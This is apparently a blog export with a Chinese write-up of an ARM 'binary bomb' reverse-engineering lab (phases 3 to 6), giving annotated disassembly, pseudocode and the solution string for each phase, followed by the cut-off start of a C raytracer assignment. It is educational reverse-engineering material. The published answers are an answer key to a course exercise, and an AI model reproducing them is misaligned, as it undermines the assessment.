&lt;phase_3+0x154&gt;8584: 000085a4 .word 0x000085a48588: 000085c4 .word 0x000085c4858c: 000085e0 .word 0x000085e0 ○38590: 00008600 .word 0x00008600 8594: 0000861c .word 0x0000861c 8598: 00008638 .word 0x00008638859c: 00008658 .word 0x0000865885a0: 00008670 .word 0x00008670/////////////////////////////////////////////////85a4: e3a03071 mov r3, #113 ; 0x71 ○485a8: e54b3005 strb r3, [fp, #-5]85ac: e51b200c ldr r2, [fp, #-12]85b0: e59f313c ldr r3, [pc, #316] ; 86f4 &lt;phase_3+0x1bc&gt;85b4: e1520003 cmp r2, r385b8: 0a000037 beq 869c &lt;phase_3+0x164&gt;85bc: eb0002cf bl 9100 &lt;explode_bomb&gt;85c0: ea000042 b 86d0 &lt;phase_3+0x198&gt;85c4: e3a03062 mov r3, #98 ; 0x62○585c8: e54b3005 strb r3, [fp, #-5]85cc: e51b300c ldr r3, [fp, #-12]85d0: e35300d6 cmp r3, #214 ; 0xd685d4: 0a000032 beq 86a4 &lt;phase_3+0x16c&gt;85d8: eb0002c8 bl 9100 &lt;explode_bomb&gt;85dc: ea00003b b 86d0 &lt;phase_3+0x198&gt;85e0: e3a03062 mov r3, #98 ; 0x62○685e4: e54b3005 strb r3, [fp, #-5]85e8: e51b200c ldr r2, [fp, #-12]85ec: e59f3104 ldr r3, [pc, #260] ; 86f8 &lt;phase_3+0x1c0&gt;85f0: e1520003 cmp r2, r385f4: 0a00002c beq 86ac &lt;phase_3+0x174&gt;85f8: eb0002c0 bl 9100 &lt;explode_bomb&gt;85fc: ea000033 b 86d0 &lt;phase_3+0x198&gt;8600: e3a0306b mov r3, #107 ; 0x6b ○78604: e54b3005 strb r3, [fp, #-5]8608: e51b300c ldr r3, [fp, #-12]860c: e35300fb cmp r3, #251 ; 0xfb8610: 0a000027 beq 86b4 &lt;phase_3+0x17c&gt;8614: eb0002b9 bl 9100 &lt;explode_bomb&gt;8618: ea00002c b 86d0 &lt;phase_3+0x198&gt;861c: e3a0306f mov r3, #111 ; 0x6f○88620: e54b3005 strb r3, [fp, #-5]8624: e51b300c ldr r3, [fp, #-12]8628: e35300a0 cmp r3, #160 ; 0xa0862c: 0a000022 beq 86bc &lt;phase_3+0x184&gt;8630: eb0002b2 bl 9100 &lt;explode_bomb&gt;8634: ea000025 b 86d0 &lt;phase_3+0x198&gt;8638: e3a03074 mov r3, #116 ; 0x74○9863c: e54b3005 strb r3, [fp, #-5]8640: e51b200c ldr r2, [fp, #-12]8644: e59f30b0 ldr r3, [pc, #176] ; 86fc &lt;phase_3+0x1c4&gt;8648: e1520003 cmp r2, r3864c: 0a00001c beq 86c4 &lt;phase_3+0x18c&gt;8650: eb0002aa bl 9100 &lt;explode_bomb&gt;8654: ea00001d b 86d0 &lt;phase_3+0x198&gt;8658: e3a03076 mov r3, #118 ; 0x76○10865c: e54b3005 strb r3, [fp, #-5]8660: e51b300c ldr r3, [fp, #-12]8664: e3530fc3 cmp r3, #780 ; 0x30c8668: 0a000000 beq 8670 &lt;phase_3+0x138&gt;866c: eb0002a3 bl 9100 &lt;explode_bomb&gt;8670: e3a03062 mov r3, #98 ; 0x62○118674: e54b3005 strb r3, [fp, #-5]8678: e51b300c ldr r3, [fp, #-12]867c: e3530f83 cmp r3, #524 ; 0x20c8680: 0a000011 beq 86cc &lt;phase_3+0x194&gt;8684: eb00029d bl 9100 &lt;explode_bomb&gt;8688: ea000010 b 86d0 &lt;phase_3+0x198&gt;868c: e3a03078 mov r3, #120 ;0x78 ○128690: e54b3005 strb r3, [fp, #-5]8694: eb000299 bl 9100 &lt;explode_bomb&gt;8698: ea00000c b 86d0 &lt;phase_3+0x198&gt;869c: e1a00000 nop ; (mov r0, r0)86a0: ea00000a b 86d0 &lt;phase_3+0x198&gt;86a4: e1a00000 nop ; (mov r0, r0)86a8: ea000008 b 86d0 &lt;phase_3+0x198&gt;86ac: e1a00000 nop ; (mov r0, r0)86b0: ea000006 b 86d0 &lt;phase_3+0x198&gt;86b4: e1a00000 nop ; (mov r0, r0)86b8: ea000004 b 86d0 &lt;phase_3+0x198&gt;86bc: e1a00000 nop ; (mov r0, r0)86c0: ea000002 b 86d0 &lt;phase_3+0x198&gt;86c4: e1a00000 nop ; (mov r0, r0)86c8: ea000000 b 86d0 &lt;phase_3+0x198&gt;86cc: e1a00000 nop ; (mov r0, r0)86d0: e55b300d ldrb r3, [fp, #-13]86d4: e55b2005 ldrb r2, [fp, #-5]86d8: e1520003 cmp r2,r3○1386dc: 0a000000 beq 86e4 &lt;phase_3+0x1ac&gt;86e0: eb000286 bl 9100 &lt;explode_bomb&gt;86e4: e24bd004 sub sp, fp, #486e8: e8bd4800 pop &#123;fp, lr&#125;86ec: e12fff1e bx lr86f0: 00064850 .word 0x0006485086f4: 00000309 .word 0x0000030986f8: 000002f3 .word 0x000002f386fc: 000001ca .word 0x000001ca 反汇编分析○1处将pc+412的数据传入r1，借助IDA pro可以查看pc+412引用的是00064850处的数据，如图： 所以该处的数据为”%d %c %d”,由此可知输入的数据的形式为int，char，int。○2处判断第一个参数int是否大于2，如果大于2则进行switch操作，如果不是则explode_bomb。○3处是对输入的第一个int进行switch判断，其伪代码如下： 123456789101112131415161718192021222324252627282930switch(int c)&#123; case 0: jmp 85a4; break; case 1: jmp 85c4; break; case 2: jmp 85e0; break; case 3: jmp 8600; break; case 4: jmp 861c; break; case 5: jmp 8638; break; case 6: jmp 8658; break; case 7: jmp 8670; break; default: jmp 868c; break; &#125; ○4-○11是对case 0 –case 7这八种情况的具体判断，其逻辑都是一样的，所以在此只分析一种情况（由于必须要求第一个int大于2，所以分析为3,4,5,6,7这五种情况）。现分析○7，首先将0x6b放入fp-5,然后将fp-12的值(即第三个传入的int的值)与0xfb(十进制为251)进行比较，如果相等则跳转86b4,如果不是的话就会explode_bomb;然后相等的话跳转86b4，我们发现从869c到86cc的逻辑都是先nop，什么都不做，然后再b 86d0 ，所以现在就到了86d0的代码块○13，其逻辑为先取fp-13(输入的第二个参数char)放到r3，然后再去fp-5的值放到r2，其中fp-5的值为刚才放的0x6b，查ascii表为k，所以结果就为3 k 0xfb,其余的case 为4,5,6,7的情况和case 3的情况类似。代码○12为default情况，其逻辑是先把0x78存入fp-5,然后就explode_bomb;所以总之就是default情况就会碰到炸弹。 密码3 k 0xfb Phase 4Arm指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596000008760 &lt;phase_4&gt;:8760: e92d4800 push &#123;fp, lr&#125;8764: e28db004 add fp, sp, #48768: e24dd010 sub sp, sp, #16876c: e50b0010 str r0, [fp, #-16]8770: e51b1010 ldr r1, [fp, #-16]8774: e59f2054 ldr r2, [pc, #84] ; 87d0 &lt;phase_4+0x70&gt; ○18778: e24b3008 sub r3, fp, #8877c: e1a00001 mov r0, r18780: e1a01002 mov r1, r28784: e1a02003 mov r2, r38788: eb0008ec bl ab40 &lt;_IO_sscanf&gt;878c: e1a03000 mov r3, r08790: e3530001 cmp r3, #18794: 1a000002 bne 87a4 &lt;phase_4+0x44&gt;8798: e51b3008 ldr r3, [fp, #-8]879c: e3530000 cmp r3, #087a0: ca000000 bgt 87a8 &lt;phase_4+0x48&gt; ○2 87a4: eb000255 bl 9100 &lt;explode_bomb&gt;////////////////////////////////////87a8: e51b3008 ldr r3, [fp, #-8]87ac: e1a00003 mov r0, r3 ○3 87b0: ebffffd2 bl 8700 &lt;func4&gt;///////////////////////////////////87b4: e1a03000 mov r3, r087b8: e3530008 cmp r3, #887bc: 0a000000 beq 87c4 &lt;phase_4+0x64&gt; ○887c0: eb00024e bl 9100 &lt;explode_bomb&gt;87c4: e24bd004 sub sp, fp, #487c8: e8bd4800 pop &#123;fp, lr&#125;87cc: e12fff1e bx lr87d0: 0006485c .word 0x0006485c00008700 &lt;func4&gt;:8700: e92d4810 push &#123;r4, fp, lr&#125;8704: e28db008 add fp, sp, #88708: e24dd00c sub sp, sp, #12870c: e50b0010 str r0, [fp, #-16]8710: e51b3010 ldr r3, [fp, #-16]8714: e3530001 cmp r3, #1 ○48718: da00000b ble 874c &lt;func4+0x4c&gt;////////////////////////////////////////////871c: e51b3010 ldr r3, [fp, #-16]8720: e2433001 sub r3, r3, #18724: e1a00003 mov r0, r3 ○58728: ebfffff4 bl 8700 &lt;func4&gt;/////////////////////////////////////////////872c: e1a04000 mov r4, r08730: e51b3010 ldr r3, [fp, #-16]8734: e2433002 sub r3, r3, #2 ○68738: e1a00003 mov r0, r3873c: ebffffef bl 8700 &lt;func4&gt;8740: e1a03000 mov r3, r08744: e0843003 add r3, r4, r38748: ea000000 b 8750 &lt;func4+0x50&gt;874c: e3a03001 mov r3, #18750: e1a00003 mov r0, r3 8754: e24bd008 sub sp, fp, #8 ○78758: e8bd4810 pop &#123;r4, fp, lr&#125;875c: e12fff1e bx lr 反汇编分析○1处是输入的参数的形式，位于87d0处，利用IDA pro找到了87d0引用了0006485C数据段的数据，为 即要求输入一个数字。○2处判断是否是输入的参数是否大于0，如果大于0则继续判断，如果不是则explode_bomb。○3处将输入的数传入r0中作为参数然后调用func4()。○4首先将传入的参数存入fp-16中，然后判断参数是否小于等于1，如果小于等于1的话就跳到○7处，○7处将返回值赋值为1，然后pop返回值和参数；如果大于1的话就到○5，○5和○6的逻辑就是分别让参数-1和-2，然后再分别调用func4，由此可以看出该bomb的逻辑是一个递归的调用。其c语言的伪代码如下： 1234567func4(int i)&#123; if(i &lt; = 1) return 1; else return func4(i-1) + func4(i-2);&#125; 然后看代码块○8，其将func4函数的返回值与8进行比较，如果等于8就通过，否则explode_bomb。所以通过计算可以得出输入的值为5。 密码5 Phase 5Arm指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455000087d4 &lt;phase_5&gt;:87d4: e92d4800 push &#123;fp, lr&#125;87d8: e28db004 add fp, sp, #487dc: e24dd018 sub sp, sp, #2487e0: e50b0018 str r0, [fp, #-24] ; 0xffffffe887e4: e51b0018 ldr r0, [fp, #-24] ; 0xffffffe887e8: eb000144 bl 8d00 &lt;string_length&gt;87ec: e1a03000 mov r3, r087f0: e3530006 cmp r3, #6 ○187f4: 0a000000 beq 87fc &lt;phase_5+0x28&gt;87f8: eb000240 bl 9100 &lt;explode_bomb&gt;////////////////////////////////////////87fc: e3a03000 mov r3, #08800: e50b3008 str r3, [fp, #-8]○28804: ea00000f b 8848 &lt;phase_5+0x74&gt;////////////////////////////////////////8808: e51b1008 ldr r1, [fp, #-8]880c: e51b3008 ldr r3, [fp, #-8]8810: e51b2018 ldr r2, [fp, #-24] ; 0xffffffe88814: e0823003 add r3, r2, r3○48818: e5d33000 ldrb r3, [r3]881c: e203300f and r3, r3, #15///////////////////////////////////////8820: e59f2060 ldr r2, [pc, #96] ; 8888 &lt;phase_5+0xb4&gt;8824: e7d22003 ldrb r2, [r2, r3] ○5///////////////////////////////////////8828: e3e0300b mvn r3, #11882c: e24b0004 sub r0, fp, #48830: e0801001 add r1, r0, r1 ○68834: e0813003 add r3, r1, r38838: e5c32000 strb r2, [r3]////////////////////////////////////883c: e51b3008 ldr r3, [fp, #-8]8840: e2833001 add r3, r3, #1 ○78844: e50b3008 str r3, [fp, #-8]////////////////////////////////////8848: e51b3008 ldr r3, [fp, #-8]884c: e3530005 cmp r3, #5 ○38850: daffffec ble 8808 &lt;phase_5+0x34&gt;///////////////////////////////////8854: e3a03000 mov r3, #08858: e54b300a strb r3, [fp, #-10]885c: e24b3010 sub r3, fp, #16 8860: e1a00003 mov r0, r3 ○88864: e59f1020 ldr r1, [pc, #32] ; 888c &lt;phase_5+0xb8&gt;8868: eb000140 bl 8d70 &lt;strings_not_equal&gt;886c: e1a03000 mov r3, r08870: e3530000 cmp r3, #08874: 0a000000 beq 887c &lt;phase_5+0xa8&gt;8878: eb000220 bl 9100 &lt;explode_bomb&gt;887c: e24bd004 sub sp, fp, #48880: e8bd4800 pop &#123;fp, lr&#125;8884: e12fff1e bx lr8888: 0008216c .word 0x0008216c888c: 00064860 .word 0x00064860 反汇编分析○1中代码首先判断读入的字符串的长度，如果长度等于6则跳到代码块○2中去，如果不等于6则explode_bomb。在代码块○2中，首先将计数变量i置为0，然后跳到代码块○3中去，在代码块○3中先判断i是否小于等于5，如果小于等于5的话就跳入○4中，其中○4○5○6○7为for循环的主体，我将其化成了这4部分。其中在○4的逻辑如下：取出字符串的第i个字符s[i],然后将s[i]与0xF相与，其中一个char为一个字节，由两个16进制数组成，做相与运算后就只取出char的后4个b，将数值存入r3中。然后到代码块○5中，找到数据pc+96（8888）处的数据，根据IDA pro得出其引用的是0008216C处的数据，数据如图： ，然后根据r3中的数值作为索引取得相应的字符，将得到的字符存入r2中，然后到代码块○6中，其将r2的数据存入(fp-4-11)+i的地址处。代码○7是将i++。所以该段代码的伪代码如下： 12345for(i = 0;i &lt;= 5;i++)&#123; int a = (int)(s[i]&amp;0xF); s1[i] = 0x0008216c+a;&#125; 其中s为输入的字符串，s1为找到的字符串。for循环结束了之后，得到长度为6的s1字符串，到了代码块○8中，该逻辑是将s1与（pc-32）即888c处的字符串进行比较，根据IDA pro得到引用了数据段00064860处的数据为： 所以只有当s1为”giants”时，才能通过，即索引顺序为0xF,0x0,0x5,0xB,0xD,0x1，查ascii表得到后4个b分别为这些的十六进制的数的字符分别为opeka（可能有多重情况，只要后4个b分别对应那五个十六进制数的字符即可）。 密码opeka Phase 6指令及逻辑分析：由于该炸弹的指令及逻辑较长，所以指令分开了几份分别进行分析。 00008890 : 读入六个数12345678910 8890: e92d4800 push &#123;fp, lr&#125;8894: e28db004 add fp, sp, #48898: e24dd048 sub sp, sp, #72 ; 0x48889c: e50b0048 str r0, [fp, #-72] ; 0xffffffb888a0: e59f3234 ldr r3, [pc, #564] ; 8adc &lt;phase_6+0x24c&gt;88a4: e50b3010 str r3, [fp, #-16]88a8: e24b3028 sub r3, fp, #40 ; 0x2888ac: e51b0048 ldr r0, [fp, #-72] ; 0xffffffb888b0: e1a01003 mov r1, r388b4: eb0000f0 bl 8c7c &lt;read_six_numbers&gt; 以上的指令的逻辑比较简单，是首先读入六个数字，并将其放入数组中，假设数组为a。 对这六个数的值进行判定1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 88b8: e3a03000 mov r3, #088bc: e50b300c str r3, [fp, #-12]88c0: e51b200c ldr r2, [fp, #-12] ○1////////////////////////////////////88c4: e3e03023 mvn r3, #35 ; 0x2388c8: e1a02102 lsl r2, r2, #288cc: e24b0004 sub r0, fp, #488d0: e0802002 add r2, r0, r2 ○288d4: e0823003 add r3, r2, r388d8: e5933000 ldr r3, [r3]///////////////////////////////////88dc: e2433001 sub r3, r3, #188e0: e3530005 cmp r3, #5 ○388e4: 9a000000 bls 88ec &lt;phase_6+0x5c&gt;88e8: eb000204 bl 9100 &lt;explode_bomb&gt;//////////////////////////////////88ec: e51b300c ldr r3, [fp, #-12]88f0: e2833001 add r3, r3, #1 ○488f4: e50b3008 str r3, [fp, #-8]88f8: ea000013 b 894c &lt;phase_6+0xbc&gt;//////////////////////////////////88fc: e51b200c ldr r2, [fp, #-12]8900: e3e03023 mvn r3, #35 ; 0x238904: e1a02102 lsl r2, r2, #28908: e24b1004 sub r1, fp, #4 ○6890c: e0812002 add r2, r1, r2 8910: e0823003 add r3, r2, r38914: e5932000 ldr r2, [r3]//////////////////////////////////8918: e51b1008 ldr r1, [fp, #-8]891c: e3e03023 mvn r3, #35 ; 0x238920: e1a01101 lsl r1, r1, #28924: e24b0004 sub r0, fp, #4 ○78928: e0801001 add r1, r0, r1892c: e0813003 add r3, r1, r38930: e5933000 ldr r3, [r3]/////////////////////////////////8934: e1520003 cmp r2, r38938: 1a000000 bne 8940 &lt;phase_6+0xb0&gt; 893c: eb0001ef bl 9100 &lt;explode_bomb&gt;8940: e51b3008 ldr r3, [fp, #-8]○88944: e2833001 add r3, r3, #18948: e50b3008 str r3, [fp, #-8]///////////////////////////////////894c: e51b3008 ldr r3, [fp, #-8]8950: e3530005 cmp r3, #5 ○58954: daffffe8 ble 88fc &lt;phase_6+0x6c&gt;//////////////////////////////////8958: e51b300c ldr r3, [fp, #-12]895c: e2833001 add r3, r3, #18960: e50b300c str r3, [fp, #-12] ○98964: e51b300c ldr r3, [fp, #-12]8968: e3530005 cmp r3, #5896c: daffffd3 ble 88c0 &lt;phase_6+0x30&gt;8970: e3a03000 mov r3, #08974: e50b300c str r3, [fp, #-12] 以上的指令为两个for循环的嵌套。其中○1为(fp-12)处存的变量假设为i，把变量i的值存入r2，然后代码段○2处为取出a[i]的值并将其存入r3中，紧接着代码段○3处判断r3的值是否大于6，如果大于6就explode_bomb。然后进入代码块○4中，在此就进入了第二个for循环，首先初始化(fp-8)处的变量，设为j，j = i+1;然后进入代码段○5处对j的值进行判断，如果大于5就进入代码段○9，其中代码○9是将i增1并进行判断，如果i大于5就跳出for循环，如果小于5则跳至○1再进行一次for循环，对于代码○5处的判断如果j小于等于5的话，则跳入代码○6处，其中逻辑为取出a[i]的值将其放入r2中，然后进入○7中，取出a[j]的值将其放入r3中，然后进入○8，将r2和r3进行比较，如果相等的话就explode_bomb,不行等就进入○5，又进行了一次循环。其伪代码如下： 12345678for(int i = 0;i &lt;= 5;i++) &#123;if(a[i]&gt;6) explode_bomb(); for(int j = i+1;j&lt;=5;j++) &#123;if(a[j] == a[i]) explode_bomb();&#125;&#125; 根据输入的6个数把链表的6个node进行索引排序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970 8978: e59f315c ldr r3, [pc, #348] ; 8adc &lt;phase_6+0x24c&gt; 897c: e50b3010 str r3, [fp, #-16]8980: e3a03001 mov r3, #1 ○18984: e50b3008 str r3, [fp, #-8]8988: ea000005 b 89a4 &lt;phase_6+0x114&gt;/////////////////////////////////////////////898c: e51b3010 ldr r3, [fp, #-16]8990: e5933008 ldr r3, [r3, #8]8994: e50b3010 str r3, [fp, #-16] ○38998: e51b3008 ldr r3, [fp, #-8]899c: e2833001 add r3, r3, #189a0: e50b3008 str r3, [fp, #-8]////////////////////////////////////////89a4: e51b200c ldr r2, [fp, #-12]89a8: e3e03023 mvn r3, #35 ; 0x2389ac: e1a02102 lsl r2, r2, #289b0: e24b1004 sub r1, fp, #489b4: e0812002 add r2, r1, r2 ○289b8: e0823003 add r3, r2, r389bc: e5932000 ldr r2, [r3]89c0: e51b3008 ldr r3, [fp, #-8]89c4: e1520003 cmp r2, r389c8: caffffef bgt 898c &lt;phase_6+0xfc&gt;////////////////////////////////////////////89cc: e51b200c ldr r2, [fp, #-12]89d0: e3e0303b mvn r3, #59 ; 0x3b89d4: e1a02102 lsl r2, r2, #289d8: e24b0004 sub r0, fp, #4 ○489dc: e0802002 add r2, r0, r289e0: e0823003 add r3, r2, r389e4: e51b2010 ldr r2, [fp, #-16]89e8: e5832000 str r2, [r3]///////////////////////////////////////////89ec: e51b300c ldr r3, [fp, #-12]89f0: e2833001 add r3, r3, #189f4: e50b300c str r3, [fp, #-12] ○589f8: e51b300c ldr r3, [fp, #-12]89fc: e3530005 cmp r3, #58a00: daffffdc ble 8978 &lt;phase_6+0xe8&gt;///////////////////////////////////////////8a04: e51b3040 ldr r3, [fp, #-64] ; 0xffffffc08a08: e50b3010 str r3, [fp, #-16]○98a0c: e3a03001 mov r3, #18a10: e50b300c str r3, [fp, #-12]/////////////////////////////////////////8a14: e51b200c ldr r2, [fp, #-12]8a18: e3e0303b mvn r3, #59 ; 0x3b8a1c: e1a02102 lsl r2, r2, #28a20: e24b1004 sub r1, fp, #4 8a24: e0812002 add r2, r1, r2○68a28: e0823003 add r3, r2, r38a2c: e5932000 ldr r2, [r3]8a30: e51b3010 ldr r3, [fp, #-16]8a34: e5832008 str r2, [r3, #8]///////////////////////////////////////8a38: e51b200c ldr r2, [fp, #-12]8a3c: e3e0303b mvn r3, #59 ; 0x3b8a40: e1a02102 lsl r2, r2, #2○78a44: e24b0004 sub r0, fp, #48a48: e0802002 add r2, r0, r28a4c: e0823003 add r3, r2, r38a50: e5933000 ldr r3, [r3]8a54: e50b3010 str r3, [fp, #-16]////////////////////////////////////8a58: e51b300c ldr r3, [fp, #-12]8a5c: e2833001 add r3, r3, #18a60: e50b300c str r3, [fp, #-12] ○88a64: e51b300c ldr r3, [fp, #-12]8a68: e3530005 cmp r3, #58a6c: daffffe8 ble 8a14 &lt;phase_6+0x184&gt; 该段代码也有一个for循环的嵌套。首先初始化，将(PC+348)的索引的数存入r3中，由ida pro得出具体数据为 所以将node1的索引传入r3，然后跳入到代码块○2，其逻辑是先取出a[i]的数据至r2，然后取出j至r3，比较这两个数据的大小，如果r2 &gt;r3,就跳到代码段○3，该逻辑是将r3+0x8的数据存入fp-16中，有以上的数据可知该数据为0x20A0，用IDA pro查找到为： 以此类推，根据每个节点的第8个字节处的数据作为下一个节点的地址，直到找到链表的a[i]个元素，就会跳出该内层的for循环，然后进入代码块○4，该逻辑是将该node的地址存入-0x3c+[R11] + 4 * i中，然后进入代码块○5，其逻辑是使变量i增1，然后判断是否大于5，如果小于5再跳入○1中继续循环。其for循环的伪代码如下： 1234567for(int i = 0;i &lt;=5;i++)&#123; node = 0x000820AC; for(int j = 1;j&lt;a[i];j++) node = *(node+0x8); -0x3c+[R11] + 4 * i = node;&#125; 所以经过上一个for循环的嵌套，从-0x3c+[R11]开始就有了这些节点的地址的索引，然后进入代码段○9，其逻辑是先将fp-12处的变量i初始化为1，目的是进入for循环。进入代码段○6,其目的是将*((-0x3c+[R11]+i-1)+0x8) = (-0x3c+[R11]+i)；然后进入代码段○7，其目的是将当前节点设为-0x3c+[R11]+i处的地址所指向的节点，进入代码块○8，使i增1并判断和5的大小关系。 判断链表的节点的数值是否是按从大到小的顺序排列的1234567891011121314151617181920212223242526278a70: e51b3010 ldr r3, [fp, #-16]8a74: e3a02000 mov r2, #08a78: e5832008 str r2, [r3, #8]8a7c: e3a03000 mov r3, #0 ○18a80: e50b300c str r3, [fp, #-12]8a84: e51b3040 ldr r3, [fp, #-64] ; 0xffffffc08a88: e50b3010 str r3, [fp, #-16]//////////////////////////////////////8a8c: e51b3010 ldr r3, [fp, #-16]8a90: e5932000 ldr r2, [r3]8a94: e51b3010 ldr r3, [fp, #-16]8a98: e5933008 ldr r3, [r3, #8] ○28a9c: e5933000 ldr r3, [r3]8aa0: e1520003 cmp r2, r38aa4: aa000000 bge 8aac &lt;phase_6+0x21c&gt;8aa8: eb000194 bl 9100 &lt;explode_bomb&gt;//////////////////////////////////////////8aac: e51b3010 ldr r3, [fp, #-16]8ab0: e5933008 ldr r3, [r3, #8] ○38ab4: e50b3010 str r3, [fp, #-16]///////////////////////////////////////8ab8: e51b300c ldr r3, [fp, #-12]8abc: e2833001 add r3, r3, #1 8ac0: e50b300c str r3, [fp, #-12] ○48ac4: e51b300c ldr r3, [fp, #-12]8ac8: e3530004 cmp r3, #48acc: daffffee ble 8a8c &lt;phase_6+0x1fc&gt; 首先进入○1进行初始化，将（fp-16）处的地址换为链表的第一个node，并对（fp-12）的变量i初始化为0。然后进入代码块○2，首先获得当前node的地址，并将该node的数据存入r2中，地址存入r3中，然后通过[r3+8]获得下一个node的地址，并将下一个node的地址存入r3中，然后比较r2和r3的值，如果r2小于r3，就explode_bomb,如果不小于就进入代码块○3，该逻辑是将当前节点（fp-16）的地址改为[r3+8]处的数值，即为下一个节点的地址，然后进入代码○4，对变量i进行增1操作，并判断和4的大小。其伪代码如下：其中node的数据结构如下： 1234567891011121314struct node &#123; int x, y; node *next; &#125;;//进行判断：node a = firstNode; for(int i = 0; i &lt; 5; i++)&#123; node b = a-&gt;next; if (a-&gt;x &gt;= b-&gt;x) a = b; else explode_bomb(); &#125; 所以根据逻辑，先找出每个节点的数据，然后再根据输入的数进行排序，保证其是从大到小的顺序排列的。根据IDA pro找到每个node所在的地址为：地址 数据 下个节点地址0x820AC 0xFD 0x820A00x820A0 0x2D5 0x820940x82094 0x12D 0x820880x82088 0x3E5 0x8207C0x8207C 0xD4 0x820700x82070 0x1B0 所以由大到小排列的话就为4 2 6 3 1 5 密码 4 2 6 3 1 5]]></content>
      <categories>
        <category>反汇编</category>
      </categories>
      <tags>
        <tag>反汇编</tag>
        <tag>体系结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raytracing]]></title>
    <url>%2F2017%2F04%2F13%2FRaytracing%2F</url>
    <content type="text"><![CDATA[题目要求本程序是根据Raytracing的要求所写。 该题目要求根据其所给的框架程序来实现raytracing的功能。 具体实现 环境是virual studio 2015和opengl 具体代码及分析如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946/*CSCI 480Assignment 3 RaytracerName: &lt;binpang&gt;*/#define _CRT_SECURE_NO_WARNINGS#define GLUT_DISABLE_ATEXIT_HACK#include &lt;pic.h&gt;#include &lt;windows.h&gt;#include &lt;GL/glu.h&gt;#include &lt;GL/glut.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string&gt;#include &lt;math.h&gt;#include &lt;vector&gt;#define MAX_TRIANGLES 2000#define MAX_SPHERES 10#define MAX_LIGHTS 10char *filename=0;#define MODE_DISPLAY 1#define MODE_JPEG 2int mode=MODE_DISPLAY;#define WIDTH 640#define HEIGHT 480#define fov 60.0#define PI 3.1415926int MaxStep = 10;int Steps = 0;//求出投射的屏幕的x和y的最大范围的坐标double yMax = tan((double)PI*fov / (2 * 180));double xMax = yMax*((double)WIDTH) / ((double)HEIGHT);unsigned char buffer[HEIGHT][WIDTH][3];struct Vertex&#123; double position[3]; double color_diffuse[3];//漫射 double color_specular[3]; //反射 double normal[3]; double shininess;&#125;;typedef struct _Triangle&#123; struct Vertex v[3];&#125; Triangle;typedef struct _Sphere&#123; double position[3]; double color_diffuse[3]; double color_specular[3]; double shininess; double radius;&#125; Sphere;typedef struct _Light&#123; double position[3]; double color[3];&#125; Light;//表示点的结构struct point&#123; double x; double y; double z;&#125;;//点在里面还是在外面struct isIn&#123; bool in; //当在三角形外面时为0，当在里面时为1 double bary[3];&#125;;//交点的结构struct intexPoint&#123; point p; double t; int tID; //物体在数组中的标号 int tObj; //如果是1表示点在圆上，如果为2表示在三角形上 isIn iO; &#125;;Triangle triangles[MAX_TRIANGLES];Sphere spheres[MAX_SPHERES];Light lights[MAX_LIGHTS];double ambient_light[3];struct point cam;int num_triangles=0;int num_spheres=0;int num_lights=0;void plot_pixel_display(int x,int y,unsigned char r,unsigned char g,unsigned char b);void plot_pixel_jpeg(int x,int y,unsigned char r,unsigned char g,unsigned char b);void plot_pixel(int x,int y,unsigned char r,unsigned char g,unsigned char b);point reflect(intexPoint p, point dir);point Render(point p, point dir);//两个点进行相减point minusPoint(point A, point B)&#123; point C; C.x = A.x - B.x; C.y = A.y - B.y; C.z = A.z - B.z; return C;&#125;//向量除以一个数point DivConst(point A, double a)&#123; point B; B.x = 0.0; B.y = 0.0; B.z = 0.0; if (abs(a) &gt; 1e-10) &#123; B.x = A.x / a; B.y = A.y / a; B.z = A.z / a; &#125; return B;&#125;//计算向量的大小double caculateSize(point A)&#123; double size; size = sqrt(pow(A.x, 2) + pow(A.y, 2) + pow(A.z, 2)); return size;&#125;//单位化向量point unitize(point A)&#123; point uni; double size; size = caculateSize(A); uni = DivConst(A, size); return uni;&#125;//点乘double dot(point A, point B)&#123; double C; C = (A.x*B.x + A.y*B.y + A.z*B.z); return C;&#125;//叉乘point cross(point A, point B)&#123; point C; C.x = (A.y*B.z - B.y*A.z); C.y = (B.x*A.z - A.x*B.z); C.z = (A.x*B.y - A.y*B.x); return C;&#125;//求出距离src，方向为dir，长度为t的点point caluPoint(point src, point dir, double t)&#123; point p; p.x = src.x + t*(dir.x); p.y = src.y + t*(dir.y); p.z = src.z + t*(dir.z); return p;&#125;//与球的交点double intersectSphere(Sphere sphere, point src, point dir)&#123; double b, c, t, t1, t2; t1 = 0; t2 = 0; c = pow((src.x - sphere.position[0]), 2) + pow((src.y - sphere.position[1]), 2) + pow((src.z - 